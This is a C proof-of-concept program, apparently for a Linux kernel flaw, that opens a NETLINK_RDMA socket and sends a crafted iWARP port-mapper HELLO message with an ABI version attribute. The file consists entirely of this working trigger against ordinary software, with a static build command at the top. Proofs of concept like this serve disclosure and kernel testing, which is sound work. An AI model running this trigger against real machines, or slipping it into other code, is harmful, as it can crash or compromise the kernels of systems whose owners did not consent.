// gcc poc.c -static -o poc.elf -lmnl
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>

#include <libmnl/libmnl.h>

#define PAGE_SIZE 0x1000
#define RDMA_NL_GET_CLIENT(type) ((type & (((1 << 6) - 1) << 10)) >> 10)
#define RDMA_NL_GET_OP(type) (type & ((1 << 10) - 1))
#define RDMA_NL_GET_TYPE(client, op) ((client << 10) + op)
#define RDMA_NL_IWCM (2)
#define IWPM_NLA_HELLO_ABI_VERSION (1)

enum
{
    RDMA_NL_IWPM_REG_PID = 0,
    RDMA_NL_IWPM_ADD_MAPPING,
    RDMA_NL_IWPM_QUERY_MAPPING,
    RDMA_NL_IWPM_REMOVE_MAPPING,
    RDMA_NL_IWPM_REMOTE_INFO,
    RDMA_NL_IWPM_HANDLE_ERR,
    RDMA_NL_IWPM_MAPINFO,
    RDMA_NL_IWPM_MAPINFO_NUM,
    RDMA_NL_IWPM_HELLO,
    RDMA_NL_IWPM_NUM_OPS
};

int main(int argc, char const *argv[])
{
    struct mnl_socket *sock;
    struct nlmsghdr *nlh;
    char buf[PAGE_SIZE];
    int err;

    sock = mnl_socket_open(NETLINK_RDMA);
    if (sock == NULL)
    {
        perror("mnl_socket_open");
        exit(-1);
    }

    nlh = mnl_nlmsg_put_header(buf);
    nlh->nlmsg_type = RDMA_NL_GET_TYPE(RDMA_NL_IWCM, RDMA_NL_IWPM_HELLO);
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    nlh->nlmsg_seq = 1;
    nlh->nlmsg_pid = 0;

    // static const struct nla_policy hello_policy[IWPM_NLA_HELLO_MAX] = {
    //     [IWPM_NLA_HELLO_ABI_VERSION]     = { .type = NLA_U16 }
    // };
    mnl_attr_put_u16(nlh, IWPM_NLA_HELLO_ABI_VERSION, 3);

    err = mnl_socket_sendto(sock, buf, nlh->nlmsg_len);
    if (err < 0)
    {
        perror("mnl_socket_sendto");
        exit(-1);
    }
    return 0;
}